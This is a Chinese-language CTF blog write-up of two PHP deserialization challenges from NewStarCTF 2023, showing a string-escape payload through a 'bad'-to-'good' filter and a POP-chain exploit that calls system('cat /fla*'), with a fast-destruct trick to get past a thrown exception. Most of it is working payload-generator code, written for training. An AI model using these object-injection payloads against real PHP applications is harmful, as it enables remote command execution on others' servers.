---
title: NewStarCTF2023 week4 反序列化记录
date: 2023-10-24 11:36 +0800
categories: [CTF,WEB]
tags: [反序列化,web]
media_subpath: /
---



## 逃

```php
<?php
highlight_file(__FILE__);
function waf($str){
    return str_replace("bad","good",$str);
}

class GetFlag {
    public $key;
    public $cmd = "whoami";
    public function __construct($key)
    {
        $this->key = $key;
    }
    public function __destruct()
    {
        system($this->cmd);
    }
}

unserialize(waf(serialize(new GetFlag($_GET['key'])))); 
```

这里传入的 `key` 先序列化，在反序列化。

这里的 序列化后 有一个waf 会将 bad 替换成 good，

我们先 正常 传入一个key，进行反序列化得到一个正常的payload

```
O:7:"GetFlag":2:{s:3:"key";s:4:"test";s:3:"cmd";s:6:"whoami";}
```

我们需要伪造的就是 `";s:3:"cmd";s:6:"whoami";}` 这一串，test后面的。

因为，bad 替换成 good 后，中间的 key 的 值 会变长，但是读取的字符串长度是固定的（`s:4:`），就可以让后面的部分`";s:3:"cmd";s:6:"whoami";}`不在反序列化的范围内。

如下面的图，经过waf后，第四段就不在反序列化的范围内了。

![image-20231024093431830](assets/image-20231024093431830.png)



```php
<?php
$cmd = 'ls /';
// ";s:3:"cmd";s:6:"whoami";}
$payload = '";s:3:"cmd";s:' . strlen($cmd) . ':"' . $cmd . '";}';
$badstr =  str_repeat('bad', strlen($payload));
$key = $badstr . $payload;
echo $key;

# badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:4:"ls /";}
```

我们简单的理解一下，就可以写成一个 payload 生成器。

![image-20231024094642983](assets/image-20231024094642983.png)

注：

```php
<?php

use GetFlag as GlobalGetFlag;

class GetFlag {
    public $key = 'badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:4:"ls /";}';
    public $cmd = "whoami";
}
// O:7:"GetFlag":2:{s:3:"key";N;s:3:"cmd";s:6:"whoami";}
// ";s:3:"cmd";s:6:"whoami";}
// ";s:3:"cmd";s:4:"ls /";}
// O:7:"GetFlag":2:{s:3:"key";s:96:"badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:4:"ls /";}";s:3:"cmd";s:6:"whoami";}

echo serialize(new GlobalGetFlag());
```





## More Fast（Exception绕过）

```php
<?php
highlight_file(__FILE__);

class Start{
    public $errMsg;
    public function __destruct() {
        die($this->errMsg);
    }
}

class Pwn{
    public $obj;
    public function __invoke(){
        $this->obj->evil();
    }
    public function evil() {
        phpinfo();
    }
}

class Reverse{
    public $func;
    public function __get($var) {
        ($this->func)();
    }
}

class Web{
    public $func;
    public $var;
    public function evil() {
        if(!preg_match("/flag/i",$this->var)){
            ($this->func)($this->var);
        }else{
            echo "Not Flag";
        }
    }
}

class Crypto{
    public $obj;
    public function __toString() {
        $wel = $this->obj->good;
        return "NewStar";
    }
}

class Misc{
    public function evil() {
        echo "good job but nothing";
    }
}

$a = @unserialize($_POST['fast']);
throw new Exception("Nope");
```

pop链

```
WEB::evil()
Pwn::__invoke[obj] --> WEB::evil()
Reverse::__get[func] --> Pwn::__invoke
Crypto::__toString[obj] --> Reverse::__get
Start::__destruct[errMsg] --> Crypto::__toString
```

```php
<?php

use Crypto as GlobalCrypto;
use Pwn as GlobalPwn;
use Reverse as GlobalReverse;
use Start as GlobalStart;
use Web as GlobalWeb;

class Start{
    public $errMsg;
    public function __destruct() {
        die($this->errMsg);
    }
}

class Pwn{
    public $obj;
    public function __invoke(){
        $this->obj->evil();
    }
}

class Reverse{
    public $func;
    public function __get($var) {
        ($this->func)();
    }
}

class Web{
    public $func;
    public $var;
    public function evil() {
        if(!preg_match("/flag/i",$this->var)){
            ($this->func)($this->var);
        }else{
            echo "Not Flag";
        }
    }
}

class Crypto{
    public $obj;
    public function __toString() {
        $wel = $this->obj->good;
        return "NewStar";
    }
}

class myclass{}


$a = new GlobalWeb();
$a->func = 'system';
$a->var = 'cat /fla*';

$b = new GlobalPwn();
$c = new GlobalReverse();
$d = new GlobalCrypto();
$e = new GlobalStart();

$b->obj = $a;
$c->func = $b;
$d->obj = $c;
$e->errMsg = $d;


$payload = serialize(array($e, null));
$payload = str_replace('i:1;N;}', 'i:0;N;}', $payload);
echo $payload;
```



![image-20231024112410706](assets/image-20231024112410706.png)



![image-20231024112832877](assets/image-20231024112832877.png)
